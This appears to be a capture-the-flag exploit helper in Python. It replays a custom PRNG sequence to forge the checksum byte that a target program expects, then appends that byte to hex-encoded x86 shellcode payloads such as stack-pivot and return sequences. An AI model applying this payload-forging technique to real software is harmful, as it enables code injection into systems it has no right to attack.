def in1t(num):
	global rand_l, rand_h, rand_div
	rand_l = 666
	rand_h = int(num)
	rand_div = 0

def GenerateRandomNumber(mod):
	global rand_l, rand_h, rand_div
	res = hex(rand_l + 1791398085 * rand_h)[2:].rjust(16, '0')
	rand_l = int(res[:8], 16)
	rand_h = int(res[8:], 16)
	if mod == 0:
		rand_div = 0
	else:
		rand_div = rand_h % mod

def test(payload):
	in1t("001015")
	GenerateRandomNumber(0)
	print()
	for i in range(10):
		GenerateRandomNumber(2)
		GenerateRandomNumber(0x1A)
	GenerateRandomNumber(0xD)
	GenerateRandomNumber(0xA)
	GenerateRandomNumber(0xE)
	GenerateRandomNumber(8)
	GenerateRandomNumber(0xC8)
	GenerateRandomNumber(0x14)
	GenerateRandomNumber(7)
	GenerateRandomNumber(0x400)

	v2 = [0] * 256
	v3 = 0
	for i in range(0, len(payload), 2):		# tohex
		v2[i//2] = int(payload[i:i+2], 16)
	for i in range(256):				# check_buf_valid
		v3 ^= v2[i]
	lsb_of_div = int(hex(rand_div)[2:].rjust(2,'0')[-2:], 16)
	last_byte = hex(v3 ^ lsb_of_div)[2:].rjust(2,'0').upper()
	print(payload + last_byte)

if __name__ == "__main__":
	payload = "8BE55DC3"
	payload = "8BE55D5B5B685B12400068F0144000558BEC6A016A026A036840124000C3"
	payload = "89ec5dc3"
	test(payload)